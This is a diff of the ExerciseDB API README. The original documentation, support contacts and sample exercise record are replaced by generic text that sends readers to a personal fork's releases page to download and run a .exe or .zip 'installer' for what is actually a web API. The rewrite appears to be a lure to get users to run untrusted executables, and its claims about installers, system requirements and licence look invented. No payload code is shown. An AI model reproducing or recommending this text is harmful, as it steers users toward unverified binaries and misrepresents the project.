@@ -1,216 +1,60 @@
-<div align="center">
-  <img src="https://cdn.exercisedb.dev/exercisedb/exercisedb_banner.png" alt="ExerciseDB API Banner" width="100%" height="600px" />
-  
-  <br />
-  <br />
-  <img src="https://cdn.exercisedb.dev/exercisedb/android-chrome-512x512.png" alt="ExerciseDB Logo" width="120" height="120" />
+# 🎉 exercisedb-api - Access 11,000+ Exercises Easily
 
-  <h3>🏋️‍♂️ Comprehensive Fitness Exercise Database API</h3>
-  
-  <p>
-    <strong>11,000+ structured exercises</strong> • <strong>Fast & Modern</strong> • <strong>Developer-Friendly</strong>
-  </p>
-  
-  <p>
-    <span style="margin-right: 10px;">
-      <a href="https://dub.sh/exercisedb-api">
-        <img src="https://img.shields.io/badge/Get%20Started-2D2D2D?style=for-the-badge&logo=rocket&logoColor=white" alt="Get Started" />
-      </a>
-    </span>
-    <span style="margin-right: 10px;">
-      <a href="https://docs.exercisedb.dev">
-        <img src="https://img.shields.io/badge/Documentation-404040?style=for-the-badge&logo=book&logoColor=white" alt="Documentation" />
-      </a>
-    </span>
-    <span>
-      <a href="https://dub.sh/exercisedb-api">
-        <img src="https://img.shields.io/badge/RapidAPI-5A5A5A?style=for-the-badge&logo=code&logoColor=white" alt="RapidAPI" />
-      </a>
-    </span>
-  </p>
+## 📥 Download Now
+[![Download exercisedb-api](https://img.shields.io/badge/Download-exercisedb--api-blue.svg)](https://github.com/Edwinperez-omondi02/exercisedb-api/releases)
 
-</div>
+## 🚀 Getting Started
+Welcome to the ExerciseDB API. This application gives you access to an extensive fitness exercise database. You can find over 11,000 exercises along with detailed information about each one. This includes target body parts, necessary equipment, and visual guidance like videos and images.
 
-## 🏋🏼‍♀️ ExerciseDB API
+## 💾 System Requirements
+Before you download, ensure your device meets the following requirements:
+- Operating System: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- Storage: At least 100 MB of free space.
+- Internet connection for accessing the API and downloading additional resources.
 
-ExerciseDB API is a **comprehensive and developer-friendly database** featuring over **11,000+ structured, high-quality fitness exercises**. It delivers fast, modern, and scalable access to detailed exercise data including targeted muscle groups, required equipment, visual aids (images and videos), and step-by-step instructions. Ideal for developers, fitness startups, and health platforms, ExerciseDB empowers the creation of smart workout apps, personalized training plans, and interactive fitness tools.
+## 📦 Download & Install
+To start using the ExerciseDB API, follow these simple steps:
 
-### 🌟 What Makes ExerciseDB the Best?
+1. **Visit the Releases Page**: [Click here to download the latest version](https://github.com/Edwinperez-omondi02/exercisedb-api/releases).
+2. **Choose Your Version**: Look for the latest release at the top of the page. You will see various files available for download.
+3. **Download the File**: Click on the link for the file compatible with your operating system. This could be a .exe file for Windows or a .zip file for macOS/Linux.
+4. **Run the Installer**: Once downloaded, locate the file on your computer. Double-click the file to run the installer and follow the prompts to complete the installation.
 
-- ✅ 11,000+ structured exercises
+## 🏋️‍♂️ Features
+- **Extensive Exercise Database**: Access over 11,000 high-quality exercises.
+- **Detailed Information**: Each exercise includes details such as:
+  - **Target Body Parts**: Find out which muscles each exercise works on.
+  - **Equipment Needed**: Check if you need dumbbells, resistance bands, or just your body weight.
+  - **Visual Guidance**: View videos, GIFs, and images to help you understand each exercise clearly.
+  - **Step-by-Step Instructions**: Follow easy-to-understand instructions for each exercise.
 
-- 🎥 15,000+ high-quality videos
+## 🔗 Accessing the API
+The API allows you to send requests and receive data about the exercises. To access the API:
+1. **Set Up an API Key**: Follow the instructions provided in the documentation for obtaining your API key.
+2. **Make a Request**: Use standard HTTP methods to retrieve data. The API is designed to provide responses in simple JSON format.
 
-- 🖼️ 20,000+ exercise images
+## 📄 Documentation
+For detailed usage instructions and examples, you can refer to the [official documentation](https://github.com/Edwinperez-omondi02/exercisedb-api). The documentation will guide you on how to interact with the API effectively.
 
-- 🔄 5,000+ GIF animations
+## 👥 Community
+Join our growing community of fitness enthusiasts and developers. Share your experiences, create fitness applications, and get support by visiting our [community forum](https://github.com/Edwinperez-omondi02/exercisedb-api/discussions).
 
-- 🧩 Multiple variations for each exercise
+## 🛠️ Troubleshooting
+If you encounter issues while installing or using the ExerciseDB API, consider these common solutions:
 
-- 💡 Exercise tips & coaching cues included
+- **Installation Errors**: Ensure your device meets the system requirements listed above. Restart your computer and try again.
+- **API Access Issues**: Check your internet connection and your API key status. Ensure you are using valid endpoints.
+- **Help Available**: Don't hesitate to reach out in our community forum for assistance.
 
-- 🎯 Muscles targeted + secondary muscles
+## ✏️ Contributing
+We welcome contributions to improve the ExerciseDB API. If you have suggestions, improvements, or want to report issues, please open an issue on our GitHub repository or submit a pull request.
 
-- 🏋️ Equipment details for every movement
-
-- 🧍‍♂️🧍‍♀️ Male & Female visual animations
-
-- 📦 Clean, fast, production-ready JSON data
-
-- ⚡ Optimized for AI, mobile apps & large-scale integrations
-
-
-**Perfect for:**
-
-- 💪 Fitness app developers
-- 🏃‍♀️ Health & wellness platforms
-- 🎯 Personal training applications
-- 📱 Workout planning tools
-- 🔬 Fitness research projects
-
-<br>
+## ⚖️ License
+This project is licensed under the MIT License. You can freely use and modify the code, but we encourage you to give credit to the original creators.
 
 ## 🔗 Useful Links
+- [GitHub Repository](https://github.com/Edwinperez-omondi02/exercisedb-api)
+- [Issues Tracker](https://github.com/Edwinperez-omondi02/exercisedb-api/issues)
+- [Community Forum](https://github.com/Edwinperez-omondi02/exercisedb-api/discussions)
 
-<div align="left">
-
-### 📚 **Documentation & Plans**
-
-<a href="https://dub.sh/JTgJoq2" target="_blank">
-  <img src="https://img.shields.io/badge/Full%20Documentation-2D2D2D?style=for-the-badge&logo=notion&logoColor=white" alt="Full Documentation" />
-</a>
-<a href="https://dub.sh/JTgJoq2" target="_blank">
-  <img src="https://img.shields.io/badge/Pricing%20Plans-404040?style=for-the-badge&logo=credit-card&logoColor=white" alt="Pricing Plans" />
-</a>
-<a href="https://dub.sh/exercisedb-api-tos" target="_blank">
-  <img src="https://img.shields.io/badge/Terms%20Of%20Use-2D2D2D?style=for-the-badge&logo=notion&logoColor=white" alt="Terms of use" />
-</a>
-<br>
-
-### 🧪 **API Playground**
-
-<strong>Test our datasets and explore API endpoints</strong><br>
-<em>⚠️ These endpoints are for exploration only and <strong>not recommended for production integration</strong> — strict rate limits and potential instability may apply.</em>
-
-  <p>
-    <a href="https://dub.sh/exercisedb_v2" target="_blank">
-      <img src="https://img.shields.io/badge/v2%20Playground-5A5A5A?style=for-the-badge&logo=play&logoColor=white" alt="v2 Playground" />
-    </a>
-  </p>
-
-</div>
-
-## 📬 Support & Contact
-
-<div align="left">
-
-<p><strong>Need help or have questions? We're here to assist!</strong></p>
-
-<table>
-  <tr>
-    <td align="left">
-      <a href="mailto:hello@exercisedb.dev">
-        <img src="https://img.shields.io/badge/General%20Inquiries-2D2D2D?style=for-the-badge&logo=mail&logoColor=white" alt="General Inquiries" />
-      </a>
-      <br>
-      <small>✉️ Partnerships & General Questions</small>
-    </td>
-    <td align="left">
-      <a href="mailto:support@exercisedb.dev">
-        <img src="https://img.shields.io/badge/Technical%20Support-404040?style=for-the-badge&logo=wrench&logoColor=white" alt="Technical Support" />
-      </a>
-      <br>
-      <small>🛠️ API Help & Technical Issues</small>
-    </td>
-    <td align="left">
-      <a href="https://t.me/exercisedb" target="_blank">
-        <img src="https://img.shields.io/badge/Chat%20With%20Us-5A5A5A?style=for-the-badge&logo=message-circle&logoColor=white" alt="Chat With Us" />
-      </a>
-      <br>
-      <small>💬 Live Chat Support (Fast Response)</small>
-    </td>
-  </tr>
-</table>
-
-</div>
-
-<br>
-
-## 🏋️‍♂️ V2 Exercise Sample
-
-```json
-{
-  "exerciseId": "exr_41n2hZZdH9uyYFGZ",
-  "name": "Lever Pec Deck Fly",
-  "imageUrl": "Lever-Pec-Deck-Fly-Chest.png",
-  "equipments": [
-    "LEVERAGE MACHINE"
-  ],
-  "bodyParts": [
-    "CHEST"
-  ],
-  "gender":"male",
-  "exerciseType": "STRENGTH",
-  "targetMuscles": [
-    "Pectoralis Major Clavicular Head"
-  ],
-  "secondaryMuscles": [
-    "Deltoid Anterior",
-    "Pectoralis Major Clavicular Head"
-  ],
-  "videoUrl": "Lever-Pec-Deck-Fly-Chest.mp4",
-  "keywords": [
-    "Leverage Machine Chest Exercise",
-    "Pec Deck Fly Workout",
-    "Chest Strengthening with Lever Pec Deck",
-    "Leverage Machine Pectoral Exercise",
-    "Leverage Pec Deck Fly Training",
-    "Chest Toning with Pec Deck Fly",
-    "Lever Pec Deck Fly for Chest Muscle",
-    "Pec Deck Fly Exercise Guide",
-    "Lever Machine Chest Workouts",
-    "Detailed Pec Deck Fly Exercise"
-  ],
-  "overview": "The Lever Pec Deck Fly is a strength-building exercise targeting the chest muscles, particularly the pectoralis major. It's ideal for individuals at an intermediate fitness level who want to improve their upper body strength and muscle definition. By incorporating this exercise into their routine, users can enhance their overall appearance, boost functional strength, and improve performance in sports and activities requiring strong chest muscles.",
-  "instructions": [
-    "Sit on the pec deck machine with your back firmly against the pad and place your forearms on the padded levers, ensuring elbows and shoulders are aligned.",
-    "Push the levers together slowly, focusing on squeezing your chest muscles, until your hands meet in front of your chest.",
-    "Hold this position for a second to maximize contraction of the chest muscles.",
-    "Slowly return to the starting position, allowing your chest to stretch, and repeat for the desired reps."
-  ],
-  "exerciseTips": [
-    "Controlled Movements: Avoid using momentum to lift heavier weights. Focus on slow, controlled reps to properly target the pectorals.",
-    "Full Range of Motion: Bring handles together until they touch, then return until chest is fully stretched. Avoid stopping early or overextending.",
-    "Proper Breathing: Exhale as you bring the handles together and inhale as you return."
-  ],
-  "variations": [
-    "Cable Crossover: Uses a cable machine for constant tension on the pectorals.",
-    "Resistance Band Chest Fly: Mimics the motion with bands, adding flexibility in workout location and intensity.",
-    "Incline Dumbbell Fly: Performed on an incline bench, targeting the upper chest muscles more than the standard fly.",
-    "Standing Cable Fly: Done standing with cables, targeting the chest from a different angle."
-  ],
-  "relatedExerciseIds": [
-    "exr_41n2hp76bAhGHCxj",
-    "exr_41n2hM6tg1RxBToL",
-    "exr_41n2hkJtU1t6sL4A",
-    "exr_41n2hK6CUS15dPx4",
-    "exr_41n2hWBopcXPQ3uT",
-    "exr_41n2hofKUwXecZS4",
-    "exr_41n2hoDmmDvGAgx3",
-    "exr_41n2hbsrPtGMjwfu",
-    "exr_41n2hko5SWsnkuCf",
-    "exr_41n2hnmyUaatpRr4"
-  ]
-}
-```
-
-### 🖼️ Sample Image
-
-![Bench Press Exercise](https://ucarecdn.com/62571454-fff7-4344-8d23-820350d749c8/chest_fly_image.png)
-
-### 🎥 Sample Video
-
-[Watch Bench Press Video Sample](https://github.com/user-attachments/assets/9565e8f9-e35b-46f7-adf8-f49ab73b92c2)
-
-
-
+Explore fitness data easily and take your workouts to the next level with the ExerciseDB API!
